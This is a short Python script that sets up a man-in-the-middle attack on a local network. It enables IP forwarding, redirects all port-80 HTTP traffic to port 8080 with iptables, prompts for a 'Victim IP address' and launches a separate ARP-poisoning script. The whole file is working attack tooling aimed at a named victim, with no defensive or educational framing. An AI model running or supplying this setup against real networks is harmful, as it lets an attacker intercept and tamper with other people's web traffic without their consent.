import os
from scapy.all import *
import time

print "Enabling IP forwarding"
file = open("/proc/sys/net/ipv4/ip_forward", "w")
file.write("1")
file.close()


print "redirecting all http traffic to port 8080"
os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")

vIP = raw_input("Victim IP address?")

file = open("vIP.txt", "w+")
file.write(vIP)
file.close

os.system("gnome-terminal -e 'python arpPoison.py' & disown")

